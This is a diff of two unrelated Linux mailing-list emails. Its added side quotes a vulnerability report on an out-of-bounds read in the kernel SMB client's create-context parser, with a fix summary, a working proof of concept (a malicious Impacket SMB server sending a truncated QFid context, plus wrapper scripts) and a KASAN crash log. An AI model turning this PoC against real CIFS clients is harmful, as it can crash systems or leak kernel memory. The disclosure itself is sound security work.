@@ -1,312 +1,751 @@
-Received: from mail-pz2-f43.google.com (mail-pz2-f43.google.com [74.125.228.43])
+Received: from mail-lr2-f35.google.com (mail-lr2-f35.google.com [74.125.230.99])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B974839EF33
-	for <linux-kernel@vger.kernel.org>; Sat, 26 Sep 2026 07:00:59 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.43
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790406061; cv=none; b=g74CJ6GJO+dxK1VI5afnr6K8MD2bNfr3Q5DvaQ3x5K2EBRATvfzW2srMH60Opu5pJ8r2CCSvahAVkjQ69N39alw2J1bqzs6tYS5w3rYbOpN2bMW/NL21ErXGKWGJxyoTVB60mOltLpUXrVoOVuLtVqu+2Pap5ZjviKCDApyhN3k=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790406061; c=relaxed/simple;
-	bh=SBZEM4eixy9EH9qcDy5q/DL1eUZ0Z/4uyOzur4eGZro=;
-	h=From:Date:Subject:MIME-Version:Content-Type:Message-Id:References:
-	 In-Reply-To:To:Cc; b=pmKyhxijfWD759LEZz4rgH2B1PBK2wSjr77KwFcIEHomvB1JrGtAmJrYBPjgq+TE1McFqd+jGd3AnH/C70IE8v7t+ejHtlA5I1vtXydEJx+2cgebB+uoxASUm4sfNlbo+Me1bxDgQohPSECDAaP4/9XYO7IUiO2Gu+ihow0TPMk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Gka2SF3Y; arc=none smtp.client-ip=74.125.228.43
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7F13F3911D5
+	for <linux-kernel@vger.kernel.org>; Sat, 26 Sep 2026 07:01:48 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.230.99
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1790406112; cv=pass; b=T0+csiVchiFNuf+j0Pxc740nUXC+1u89c/IcySSAW4KycQDa/tAibnrnEcSwa8tlCUQUJilIaApwSvUd+WBx8ddHl3iLKbDXCnH4vzXWwVW4ltgCu1XLrzXknKVbklKrthVvmw7UjGgLpdv78mkrRd8uJVx2JtDDGbHeR7UjMCE=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1790406112; c=relaxed/simple;
+	bh=Rmm2SEe0q+WBujaPvKtEypO4p6Nslq/NVAv4L9MOiMM=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=YqmFOCMfKHQv8HzYH61bCCFqfngb+H0OO/vne3k5PtPnwmK29Ptg22lJje0qxJOXG5S4I6DttPXcONGygdLu9et7SD65Ih7MH0HdoiUOa91nw1yTM5YnSjy37gtEiJkzCn13OnInfZVzx57JT9papZZq+UjI+tmecAFU/qpn3lc=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=FzmyGjPw; arc=pass smtp.client-ip=74.125.230.99
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Gka2SF3Y"
-Received: by mail-pz2-f43.google.com with SMTP id 41be03b00d2f7-cc4aa0f1a94so521692a12.2
-        for <linux-kernel@vger.kernel.org>; Sat, 26 Sep 2026 00:00:59 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="FzmyGjPw"
+Received: by mail-lr2-f35.google.com with SMTP id 38308e7fff4ca-3a60e33d456so12549461fa.1
+        for <linux-kernel@vger.kernel.org>; Sat, 26 Sep 2026 00:01:48 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1790406106; cv=none;
+        d=google.com; s=arc-20260327;
+        b=TcY6qt8OlObNMY3qDtSuopvB6VwGNQqOPg4q0VoBPx3ELLxhptdazJtOhPJqyhxzMe
+         2sk3UCnjYKrOh4XcMXoCuMWalKGG//GL9SjI7YpFvk3wRHe2iN2k0KopIQcjdBAscwGu
+         4kkgT4xmqCIXFEUlPwJThzebl/ka88ZFvIdMvuT1EC2cV8d5ySAYCo/o7JbVmVpwFfZU
+         iEj9ma3DRhhVKSADDnt6muOcE+BaznGtmVmO2v5CIM9jmYnVLw1dO06cViHCG4Se09WN
+         BwbLdc2gZRTnsBi2O5emvmMvlF03qad4gGWKJwiec9fU8ELufrX30R/HhugbApsKSt9y
+         y2IQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=HkAH0ElqWQcmlizAkROJe5rZXlgPBqdsI0w1manhKdE=;
+        fh=X3f1ywhcYo5Sd5ZahpgxAyifom7QTDwrWmDgJMaxjbI=;
+        b=hpGJcEoNrxw6WadW7cCvb4zzDvpm5/xy285zvAU29WrnVLNex/XZ78pxPEj7SMr3tg
+         khnCo3yUnOY7E5ZfMOz+mo1ncM0ImtVs7r9Vm04FfTAAx2fx5g2hUuVJd0ddqbkrmTQS
+         t8CZ1aZrSxBnHiMfp1YAFCkboBkxitJETharRGLGloNCKWnwaN8VAsCXsJm7delImiFk
+         G5hezUKk6pwUqz3QVe9/dV59uV5KYO8iyUpteRoIicg71aZA4YfXd4BwIfuqjiHN6tg/
+         jRdt6eZFexKhrWyLh29tPPn+pq5sFyHyAwvsgyfcGTcJPAzI1AhCtr55KoJ8U/MoXMze
+         5o8g==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1790406059; x=1791010859; darn=vger.kernel.org;
-        h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
-         :content-type:mime-version:subject:date:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=OnL76jpHr7vBDo6mf67vFeDAqzHFwrvodH62utIq19k=;
-        b=Gka2SF3Y2D1Vol3QKPz38uRrRQQbr0d6jt1DQ+a03cAgrAsIBjzGF30879xUJkjYhF
-         dGy7RhHrMIU2vz3LNlN+aMSwKUsLJFDzrRL8jfMNReP+ajr0fyw3gWpsWQJhohUB1r5C
-         CY7K+fti+aFYCHzyglCyBvTWsnNBLeezn6S9Uoc9P6IWqlLmlwgXEEIn0s6lWRnSz4eM
-         2cwW7Vxsx2A1LS0U0EtJU63Jq8BVOze8OqPNCgUtCi3HC4S2CbJJ9nqvHiuXLzOnw1sD
-         x9gpRT/hxu+6CsB74mg/jd/i3xUJpNN6fFkNHJ5/xM30Ibw1CO1soi6N/Gfzx5zat9ZW
-         kRDg==
+        d=nebusec.ai; s=google; t=1790406106; x=1791010906; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=HkAH0ElqWQcmlizAkROJe5rZXlgPBqdsI0w1manhKdE=;
+        b=FzmyGjPw0YEuTuzunYd4nyhz/zZ6fW2Pe3xM4XFo0xgCaP0bcdc98Ucn8Nts470rj8
+         91Lag7C5ugFTiuiXAHCmF8saikc6eNwAXuFRq6u50ufzsnBBwSjRpJTb/zPR/LYnxSWW
+         70uqqshsSnxa9L81NFB6Hjgor5o4Wxxden79H4k4Cwf1AduU9kDsAgo4UY+JMMZnN4Zu
+         +q09pKkuIfENH1ZJ6urYf5irC0HgVUvVfXorps0Y83y+55WoEdBPkrRPxktLXImCz5jc
+         9gB7B5Guo6pjQ3RXsz7rr+Emsm200Vr6XeUEbh21/AeY+13AZKeHrV/VbG4momxAlXzM
+         uXsQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1790406059; x=1791010859;
-        h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
-         :content-type:mime-version:subject:date:from:x-gm-gg
+        d=1e100.net; s=20260707; t=1790406106; x=1791010906;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:x-gm-gg
          :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
          :content-type;
-        bh=OnL76jpHr7vBDo6mf67vFeDAqzHFwrvodH62utIq19k=;
-        b=CAjCEv0Lss6vc/wNX+kOsUBTQirHNgJ9KX10mm1Q6hQIx49XOZ0MwfYN/AIvH8DBzO
-         4mwqtXKtzT3upiU1W3+yoAO/Rox6ImAwS7putMv7GWktmsq8O+dkbdYYSLaCpuuVKpa0
-         Tq33HQD+AY3pgv6fUlNaSU9sQxXlwwnooSmwGHeLY0r/ZKoCTSKz2fYOAw1xijKlsZeU
-         KYSAz4BZdrYi+XxMgqHLZXRHdRPfURCigo8nFHSeEgU4H+qlyFooPgFJpYtK4o+P8u50
-         rqso+51SrikKnP4FMbnvApVaOJAW/6Gp01cZ5Zd2OzmPVoglQPAuXZj0LQn0Rvk8JxxI
-         lcLg==
-X-Forwarded-Encrypted: i=1; AKwUvBzdoyyv2IKw00JpjeXvgWf7gvPPCIMqGQeMBvU1bEFibwikmmGf/Ga4yZstynloMgNIpdlZOvR0/X/68I4=@vger.kernel.org
-X-Gm-Message-State: AFuF++lmZddJPAtXCyhxp50eNdzC7A6wFeDxNLdqzgvFUw1nuDyryBOH
-	EmMBc5G2M5qANZuihYKec+yPtdtT5Jz9/D0Pqum9P3r0cjODD4Lcz128
-X-Gm-Gg: AYBFou0g7T/T0rRtUWTI5HBXQPM9twZhQwroeUtQwTcL/VfFehobEiHhssB3fooE9sh
-	WJcAfL2uwhmfdsFm8CuFZ39SRPLHCYSS68MyRiJPF7Ul5d5KHnbg8QtJMIO/YPuITrQ/Chlx/2l
-	6WaIPPaM7b9V4+BqhOP77jQQUBs+NXdmms7dDK0k8DV4/jVp4oIBn2f2zTNi3Oc8NocMZyT/suQ
-	HluncUGl49FYGigFT0V8D8NBBN54XWUHK22kWgVBUh0GNDGMvewwz5+tHBg49dwHP8an4bxEtmi
-	9IOBiP0Q6WvwTyWIzLuShlFZKhTli7TaG4w3iLJkgCxVReKMqpGwKm53gN7RYwyUT03ako15g3+
-	vuZiYEiTEgh4xdgShk1S+h/ogfnsArIJzMTvrVygs7L1LP+C+YWfiHjJM9T1EbNTYZQrFVig7jX
-	xVtvomLL3B2sX/FLaIJ82hmPLCDIVlJJYWOTwCc+vr7+HQlGkoH/l6Ryl0mevP3bDtg+mI2Q==
-X-Received: by 2002:a17:90b:3e4d:b0:3a0:da60:813e with SMTP id 98e67ed59e1d1-3a0da6082ffmr1187847a91.34.1790406058759;
-        Sat, 26 Sep 2026 00:00:58 -0700 (PDT)
-Received: from [10.1.2.130] ([67.185.120.12])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0974ec5d0sm15987119a91.4.2026.09.26.00.00.58
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 26 Sep 2026 00:00:58 -0700 (PDT)
-From: Kir Kolyshkin <kolyshkin@gmail.com>
-Date: Sat, 26 Sep 2026 00:00:54 -0700
-Subject: [PATCH v2 2/2] selftests/filesystems: test
- OPEN_TREE_DROP_MNTNS_MOUNTS
+        bh=HkAH0ElqWQcmlizAkROJe5rZXlgPBqdsI0w1manhKdE=;
+        b=D0mSdiaU7EH36niFgjmvd51Wc8JIETEbk/i9wIc8do+Tg2h/V1UnAYFHA7khktgijV
+         jttPRO4Sge8wOOFERgswh2TuP2cDKJKt7RLvMSA5PvqHvPmZ2sRWZKYkU7+a2Z1pD5PA
+         nWiMSN55odpYJXFmdXgtX39J/UcvdbWQMaLdyTEuxa1QNpBzSuFW6618987hHuikmHS3
+         pM1914iQP4HGmyEJYpP3P1GX1HLKQZyQ9UC+wVQCE4fiNaP+xT6a2hkGq1EKL6j4tS2k
+         Z5NInmSMm5H96ZDHErDgNfCbW6IE4DHLQh2dyoY7byyQJUKDS7+72ITpwZZo4lC7CF37
+         mo4w==
+X-Forwarded-Encrypted: i=1; AKwUvBwlj96GWknWcZKPswHxCHeC2NKlg4Hx4c0o7ByJeiWOHj7bo+TmmHkF6LeTX7yd0fwTbrI4zvzQWZlXe5M=@vger.kernel.org
+X-Gm-Message-State: AFuF++mofS/Pnu3hkql26aSPJgaMGI4Qea8Uxj999LUTf1mZs9OP9XU+
+	enmbz/n402CM8b+wzlKveJwvcEFYBPCoMIVemkJJ8d5JCORYBtaiR4XUjcB8XWlpKL0QCkpUmHm
+	dAWUbFdkWattWNDJiekr0Bg8r70Bme31wKNSjLSj0LF8=
+X-Gm-Gg: AYBFou1A8sMnNPeNAC359du9Deh+uJKJPmY1QxlTAyqql+cPGhHDQmKTdwL5gaTZh+h
+	3JhrxS8iqkTtwC69glBE3CRdfbHBViTCwt2cG67hD1itcqtEkd0vWZ/EVgjr2uE0fbgU3RiDYou
+	xYtH1QmydZ9DzgO6IrAMFE/cV3k/PUXIi/yrxv+aadYo9gk3L7tWkgu3ZNVfFT41x0G9JfKHLbc
+	wyv3CTTppX/Oc67wS/03eLwW2vWgcA2DSX1mnPprlPUXXqZXr4oGFxj9t4GwG+9fW3LsxDz17Ms
+	JaL0RAanc1qrBZseTP3gjRuuq1egr17six64cgk5XZlNLBaOvs4GIlQrLkRXv6vidgdvTJfJLgt
+	3DlMz8cPNgw==
+X-Received: by 2002:a05:651c:31c6:b0:3a5:d0ad:7df5 with SMTP id
+ 38308e7fff4ca-3a63c0f6fb0mr18968391fa.21.1790406106269; Sat, 26 Sep 2026
+ 00:01:46 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
-Message-Id: <20260926-nsfs-prune-rfc-v2-2-53509260e4e7@gmail.com>
-References: <20260926-nsfs-prune-rfc-v2-0-53509260e4e7@gmail.com>
-In-Reply-To: <20260926-nsfs-prune-rfc-v2-0-53509260e4e7@gmail.com>
-To: Christian Brauner <brauner@kernel.org>, 
- Alexander Viro <viro@zeniv.linux.org.uk>, Aleksa Sarai <cyphar@cyphar.com>
-Cc: Jan Kara <jack@suse.cz>, Jeff Layton <jlayton@kernel.org>, 
- "Eric W . Biederman" <ebiederm@xmission.com>, 
- David Howells <dhowells@redhat.com>, Amir Goldstein <amir73il@gmail.com>, 
- Andrei Vagin <avagin@google.com>, Shuah Khan <shuah@kernel.org>, 
- Giuseppe Scrivano <giuseppe@scrivano.org>, linux-fsdevel@vger.kernel.org, 
- linux-kernel@vger.kernel.org, linux-kselftest@vger.kernel.org, 
- containers@lists.linux.dev, Kir Kolyshkin <kolyshkin@gmail.com>
-X-Mailer: b4 0.14.3
+References: <cover.1790398755.git.zihanx@nebusec.ai>
+In-Reply-To: <cover.1790398755.git.zihanx@nebusec.ai>
+From: zihan xi <zihanx@nebusec.ai>
+Date: Sat, 26 Sep 2026 15:01:36 +0800
+X-Gm-Features: AclHuK-IW3IfWwlOaNDpqQ7Vsmdw0eSUiVdAf9GSir0WSvmG6gF0c9pPWvUgEDQ
+Message-ID: <CAANe3eRw6ySzMQJP2g=vBXfZeNqWNW8eX5vTmzp5bxfaA8+9bA@mail.gmail.com>
+Subject: Re: [PATCH v5 0/6] smb: client: fix create context out-of-bounds reads
+To: Paulo Alcantara <pc@manguebit.org>
+Cc: ronniesahlberg@gmail.com, sprasad@microsoft.com, tom@talpey.com, 
+	bharathsm@microsoft.com, pshilovsky@samba.org, aaptel@suse.com, 
+	pali@kernel.org, linux-cifs@vger.kernel.org, samba-technical@lists.samba.org, 
+	linux-kernel@vger.kernel.org, stable@vger.kernel.org, 
+	Namjae Jeon <linkinjeon@kernel.org>
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-Pin a mount namespace below a tmpfs mount, the way snapd does under
-/run/snapd/ns, and attach a recursive clone of that tmpfs inside a
-younger mount namespace created with OPEN_TREE_NAMESPACE.  Without
-OPEN_TREE_DROP_MNTNS_MOUNTS move_mount(2) fails with ELOOP; with it,
-it succeeds.
+On Sat, Sep 26, 2026 at 2:49=E2=80=AFPM Zihan Xi <zihanx@nebusec.ai> wrote:
+>
+> Hi Linux kernel maintainers,
+>
+> We found and validated an issue in fs/smb/client/smb2pdu.c. A malicious
+> SMB server can send a malformed SMB2 CREATE response to a CIFS client and
+> trigger an out-of-bounds read. We validated this with an Impacket server =
+on
+> the QEMU host and a root CIFS client in the guest; CIFS does not set
+> FS_USERNS_MOUNT, so the mount must run as root. For valid SMB responses,
+> the series preserves existing request handling. No impact was observed in
+> the tested CIFS mount/read path; a full filesystem regression suite was n=
+ot
+> run.
+>
+> We will provide detailed information about the bug
+> in this email, along with a PoC to trigger it.
+>
+> ---- details below ----
+>
+> Bug details:
+>
+> smb2_parse_contexts() validates the complete create-context area but does
+> not limit each context record to its Next field before dispatching it. A
+> malformed chain can therefore allow a handler to read bytes beyond the
+> current context. The QFid handler also cast the context to a full respons=
+e
+> structure without verifying that DataLength covered DiskFileId, so a
+> truncated QFid context could read past the response allocation. A
+> non-terminal Next that does not leave a complete following context header
+> is rejected as malformed.
+>
+> The parser rejects NameOffset and DataOffset values before the context
+> header, bounds the name range by the current record with checked arithmet=
+ic,
+> and dispatches known handlers only when DataLength is non-zero.
+>
+> The SMB2/SMB3 lease parsers also read LeaseState and LeaseFlags at
+> canonical offsets rather than from DataOffset. Patch 1 limits each record
+> to Next, reads QFid data only when its payload covers DiskFileId, and
+> parses lease data from DataOffset with the exact v1/v2 lease payload size=
+s.
+> A size mismatch skips lease parsing without failing the open. These sizes
+> match the fixed payload sizes used by the CIFS request builders and
+> ksmbd; a future extension must update the parser explicitly.
+>
+> parse_posix_ctxt() reads nlink, reparse_tag, and mode before checking tha=
+t
+> the POSIX data contains them. The in-tree smb2_open_file() path passes a
+> NULL posix pointer, so ordinary opens do not reach this handler. Patch 2
+> still checks the handler's minimum data length and preserves soft failure
+> for malformed optional metadata.
+>
+> Tracing the parser callers and compound error paths through cleanup and
+> return-value handling also exposed the additional independent issues fixe=
+d
+> by patches 3 through 6.
+>
+> After a successful CREATE, SMB2_open() increments num_remote_opens before
+> parsing its contexts. Patch 3 calls SMB2_close() after a parsing failure.
+> SMB2_close() decrements num_remote_opens only after a confirmed successfu=
+l
+> close response. If a close is interrupted or transport fails, the existin=
+g
+> best-effort behavior retains conservative accounting when the remote resu=
+lt
+> is unknown.
+>
+> open_cached_dir() sends CREATE and QUERY_INFO as a compound request. Patc=
+h
+> 4 validates the CREATE response before using its fields, records the CREA=
+TE
+> FIDs, marks the handle open, and increments the remote-open count before
+> processing later-command errors. It also handles -EREMCHG before response
+> validation, so a missing response does not hide the reconnect request.
+> Patch 5 marks earlier completed mids as cancelled when a later compound
+> wait is interrupted or MID synchronization or state validation fails. It
+> keeps their response buffers attached until synchronization is complete, =
+so
+> the existing cancelled-mid cleanup can inspect each successful CREATE and
+> queue SMB2_close(). The remote-open count is incremented only after close
+> work allocation succeeds and before queueing it, so an OOM does not leave
+> an unmatched count. It marks smb2_unlink()'s create+close compound so it
+> is not closed again. Non-CREATE responses and compounds with a close keep
+> their existing behavior.
+>
+> Patch 6 preserves a create-context parsing error in the
+> SMB2_OP_OPEN_QUERY compound path while later responses are processed.
+>
+> The series keeps separate Fixes tags for the independent root causes, wit=
+h
+> each tag pointing to the earliest commit that introduced its root cause.
+>
+> The parser changes overlap with Frank Sorenson's related bounds-checking
+> patch for smb2_parse_contexts():
+> https://lore.kernel.org/all/20260826153147.4112943-12-sorenson@redhat.com=
+/
+> This series incorporates the NameOffset, Next, and zero-data dispatch che=
+cks
+> while retaining the stricter per-record successor-header validation and t=
+he
+> handler-specific payload checks.
+>
+> The reproducer uses an Impacket SMB server that modifies the SMB2 CREATE
+> response. packetdrill is not used because it cannot implement the require=
+d
+> stateful SMB server or rewrite this response.
+>
+> Reproducer:
+>
+> From the PoC directory:
+>
+>     gcc -O2 -static -o poc poc.c
+>     chmod +x poc.sh
+>     ./poc
+>
+> The wrapper starts the Impacket server on the host at tcp/4445. The
+> validation uses QEMU user-mode networking (`-netdev user`), so no
+> additional veth, network namespace, or TCP proxy is needed. Configure the
+> guest interface and route as follows:
+>
+>     ip link set eth0 up
+>     ip addr add 10.0.2.15/24 dev eth0
+>     ip route add default via 10.0.2.2
+>
+> Then, as root in the guest, mount the share and read the trigger file:
+>
+>     mkdir -p /mnt/test
+>     mount -t cifs //10.0.2.2/SHARE /mnt/test \
+>         -o user=3D,password=3D,vers=3D2.0,sec=3Dntlmssp,port=3D4445,noper=
+m,soft
+>     cat /mnt/test/probe >/dev/null
+>
+> The C wrapper execs ./poc.sh, so poc.sh must retain its executable bit (o=
+r
+> be made executable with chmod +x as shown). On first use, the wrapper
+> creates a virtual environment and installs Impacket 0.13.1. The initial
+> setup requires network access to the configured package index; an existin=
+g
+> virtual environment needs no installation.
+> The guest-side mount is shown separately because CIFS does not set
+> FS_USERNS_MOUNT; the validated mount/read commands run as root in the
+> guest.
+>
+> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+> ------BEGIN poc.c------
+> #include <stdio.h>
+> #include <unistd.h>
+>
+> int main(int argc, char **argv)
+> {
+>         (void)argc;
+>         argv[0] =3D "./poc.sh";
+>         execv(argv[0], argv);
+>         perror("execv ./poc.sh");
+>         return 127;
+> }
+> ------END poc.c--------
+>
+> ------BEGIN poc.sh------
+> #!/bin/bash
+> set -euo pipefail
+>
+> SCRIPT_DIR=3D$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
+> VENV_DIR=3D"$SCRIPT_DIR/.venv-impacket"
+>
+> if [[ ! -x "$VENV_DIR/bin/python" ]]; then
+>     python3 -m venv "$VENV_DIR"
+>     "$VENV_DIR/bin/pip" install impacket=3D=3D0.13.1
+> fi
+>
+> exec "$VENV_DIR/bin/python" "$SCRIPT_DIR/poc.py" "$@"
+> ------END poc.sh--------
+>
+> ------BEGIN poc.py------
+> #!/usr/bin/env python3
+> import logging
+> import signal
+> import struct
+> from pathlib import Path
+>
+> from impacket import smbserver
+> from impacket import smb3structs as smb2
+> from impacket.nt_errors import STATUS_SUCCESS
+>
+>
+> PORT =3D 4445
+> SHARE_NAME =3D "SHARE"
+> TARGET_NAME =3D "probe"
+> TARGET_OFFSET =3D 424
+> CONTEXT =3D struct.pack("<IHHHHI4s4x", 0, 16, 4, 0, 24, 0, b"QFid")
+> ALIGN_PAD =3D b"\x00" * (TARGET_OFFSET - 152)
+>
+>
+> def prepare_share(share_dir: Path) -> None:
+>     share_dir.mkdir(parents=3DTrue, exist_ok=3DTrue)
+>     (share_dir / "placeholder").touch()
+>     (share_dir / TARGET_NAME).write_bytes(b"x")
+>
+>
+> def main() -> None:
+>     base_dir =3D Path(__file__).resolve().parent
+>     share_dir =3D base_dir / "share"
+>     prepare_share(share_dir)
+>
+>     logging.basicConfig(level=3Dlogging.INFO, format=3D"%(levelname)s:%(m=
+essage)s")
+>
+>     original =3D smbserver.SMB2Commands.smb2Create
+>
+>     def malicious_smb2_create(conn_id, smb_server, recv_packet):
+>         req =3D smb2.SMB2Create(recv_packet["Data"])
+>         raw_name =3D req["Buffer"][: req["NameLength"]]
+>         name =3D smbserver.normalize_path(raw_name.decode("utf-16le"))
+>
+>         commands, packets, error =3D original(conn_id, smb_server, recv_p=
+acket)
+>         print(f"CREATE name=3D{name!r} err=3D0x{error:08x}", flush=3DTrue=
+)
+>
+>         if error =3D=3D STATUS_SUCCESS and name =3D=3D TARGET_NAME:
+>             resp =3D commands[0]
+>             resp["CreateContextsOffset"] =3D TARGET_OFFSET
+>             resp["CreateContextsLength"] =3D len(CONTEXT)
+>             resp["AlignPad"] =3D ALIGN_PAD
+>             resp["Buffer"] =3D CONTEXT
+>             print(
+>                 f"injected truncated QFid context; packet_len=3D{64 + len=
+(resp.getData())}",
+>                 flush=3DTrue,
+>             )
+>
+>         return commands, packets, error
+>
+>     smbserver.SMB2Commands.smb2Create =3D staticmethod(malicious_smb2_cre=
+ate)
+>
+>     server =3D smbserver.SimpleSMBServer(listenAddress=3D"0.0.0.0", liste=
+nPort=3DPORT)
+>     server.setSMB2Support(True)
+>     server.addShare(SHARE_NAME, str(share_dir), readOnly=3D"yes")
+>     server.setLogFile("/dev/stdout")
+>
+>     print(f"Serving //10.0.2.2/{SHARE_NAME} on tcp/{PORT}", flush=3DTrue)
+>     print("Trigger file: probe", flush=3DTrue)
+>
+>     signal.signal(signal.SIGTERM, lambda _sig, _frame: (_ for _ in ()).th=
+row(SystemExit(0)))
+>     try:
+>         server.start()
+>     except (KeyboardInterrupt, SystemExit):
+>         pass
+>
+>
+> if __name__ =3D=3D "__main__":
+>     main()
+> ------END poc.py--------
+>
+> The following excerpt is from the output of
+> scripts/decode_stacktrace.sh when run on the unpatched baseline log. The
+> command used was:
+>
+>     ./scripts/decode_stacktrace.sh vmlinux source-tree < baseline.log
+>
+> The excerpt below is the resulting output.
+> ----BEGIN crash log----
+> [ 1344.780735] [  T11242] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D
+> [ 1344.780750] [  T11242] BUG: KASAN: slab-out-of-bounds in smb2_parse_co=
+ntexts (fs/smb/client/smb2pdu.c:3337)
+> [ 1344.780838] [  T11242] Read of size 8 at addr ff1100007e4b3180 by task=
+ cat/11242
+>
+> [ 1344.780880] [  T11242] CPU: 0 UID: 0 PID: 11242 Comm: cat Not tainted =
+7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
+> [ 1344.780887] [  T11242] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + P=
+IIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> [ 1344.780907] [  T11242] Call Trace:
+> [ 1344.780918] [  T11242]  <TASK>
+> [ 1344.780925] [  T11242]  dump_stack_lvl (lib/dump_stack.c:88)
+> [ 1344.780980] [  T11242]  print_report (mm/kasan/report.c:288 (discrimin=
+ator 1) mm/kasan/report.c:376 (discriminator 1) mm/kasan/report.c:482 (disc=
+riminator 1))
+> [ 1344.781004] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c=
+:3337)
+> [ 1344.781009] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781030] [  T11242]  ? __virt_addr_valid (arch/x86/mm/physaddr.c:55=
+)
+> [ 1344.781052] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c=
+:3337)
+> [ 1344.781057] [  T11242]  kasan_report (mm/kasan/report.c:640)
+> [ 1344.781065] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c=
+:3337)
+> [ 1344.781077] [  T11242]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:3=
+337)
+> [ 1344.781085] [  T11242]  ? _raw_spin_unlock (include/asm-generic/qspinl=
+ock.h:128 (discriminator 4) include/linux/spinlock.h:205 (discriminator 4) =
+include/linux/spinlock_api_smp.h:168 (discriminator 4) kernel/locking/spinl=
+ock.c:190 (discriminator 4))
+> [ 1344.781101] [  T11242]  SMB2_open (fs/smb/client/smb2pdu.c:3344)
+> [ 1344.781107] [  T11242]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unico=
+de.c:419 fs/smb/client/cifs_unicode.c:491)
+> [ 1344.781129] [  T11242]  ? __pfx_SMB2_open+0x10/0x10
+> [ 1344.781135] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781139] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781145] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781149] [  T11242]  ? __kmalloc_noprof (arch/x86/include/asm/atomi=
+c.h:23 include/linux/atomic/atomic-arch-fallback.h:457 include/linux/jump_l=
+abel.h:248 mm/slab.h:458 mm/slub.c:4558 mm/slub.c:5392)
